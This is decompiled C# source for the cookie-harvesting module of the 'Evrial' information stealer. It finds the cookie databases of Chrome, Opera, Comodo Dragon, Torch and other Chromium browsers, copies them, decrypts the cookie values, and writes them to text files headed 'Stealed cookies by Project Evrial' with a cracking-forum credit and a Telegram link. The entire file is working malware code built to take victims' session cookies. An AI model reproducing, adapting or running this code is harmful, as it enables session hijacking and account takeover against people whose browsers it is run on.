using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Evrial.Stealer;

namespace Evrial.Cookies
{
	// Token: 0x0200001C RID: 28
	internal static class Chromium
	{
		// Token: 0x06000044 RID: 68 RVA: 0x000042C0 File Offset: 0x000024C0
		public static void ChromiumInitialise(string path)
		{
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
				environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
				environmentVariable + "\\Torch\\User Data\\Default\\Cookies"
			};
			foreach (string text in array)
			{
				try
				{
					string str = "";
					if (text.Contains("Chrome"))
					{
						str = "Google";
					}
					if (text.Contains("Yandex"))
					{
						str = "Yandex";
					}
					if (text.Contains("Orbitum"))
					{
						str = "Orbitum";
					}
					if (text.Contains("Opera"))
					{
						str = "Opera";
					}
					if (text.Contains("Amigo"))
					{
						str = "Amigo";
					}
					if (text.Contains("Torch"))
					{
						str = "Torch";
					}
					if (text.Contains("Comodo"))
					{
						str = "Comodo";
					}
					try
					{
						List<Cookie> cookies = Chromium.GetCookies(text);
						if (cookies != null)
						{
							Directory.CreateDirectory(path + "\\Cookies\\");
							using (StreamWriter streamWriter = new StreamWriter(path + "\\Cookies\\" + str + "_cookies.txt"))
							{
								streamWriter.WriteLine("# ----------------------------------");
								streamWriter.WriteLine("# Stealed cookies by Project Evrial ");
								streamWriter.WriteLine("# Crack XakFor.Net ");
								streamWriter.WriteLine("# Telegram: https://t.me/joinchat/Dk-XFgiWpYO-5nPzsNeCoQ");
								streamWriter.WriteLine("# ----------------------------------\r\n");
								foreach (Cookie cookie in cookies)
								{
									if (cookie.expirationDate == "9223372036854775807")
									{
										cookie.expirationDate = "0";
									}
									if (cookie.domain[0] != '.')
									{
										cookie.hostOnly = "FALSE";
									}
									streamWriter.Write(string.Concat(new string[]
									{
										cookie.domain,
										"\t",
										cookie.hostOnly,
										"\t",
										cookie.path,
										"\t",
										cookie.secure,
										"\t",
										cookie.expirationDate,
										"\t",
										cookie.name,
										"\t",
										cookie.value,
										"\r\n"
									}));
								}
							}
						}
					}
					catch
					{
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
				}
			}
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00004604 File Offset: 0x00002804
		private static List<Cookie> GetCookies(string basePath)
		{
			if (!File.Exists(basePath))
			{
				return null;
			}
			List<Cookie> result;
			try
			{
				string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(basePath, text, true);
				Sqlite sqlite = new Sqlite(text);
				sqlite.ReadTable("cookies");
				List<Cookie> list = new List<Cookie>();
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					try
					{
						string value = string.Empty;
						try
						{
							byte[] bytes = Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 12)), null);
							value = Encoding.UTF8.GetString(bytes);
						}
						catch (Exception)
						{
						}
						bool flag;
						bool.TryParse(sqlite.GetValue(i, 6), out flag);
						list.Add(new Cookie
						{
							domain = sqlite.GetValue(i, 1),
							name = sqlite.GetValue(i, 2),
							path = sqlite.GetValue(i, 4),
							expirationDate = sqlite.GetValue(i, 5),
							secure = flag.ToString().ToUpper(),
							value = value,
							hostOnly = "TRUE"
						});
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.ToString());
					}
				}
				result = list;
			}
			catch
			{
				result = new List<Cookie>();
			}
			return result;
		}
	}
}
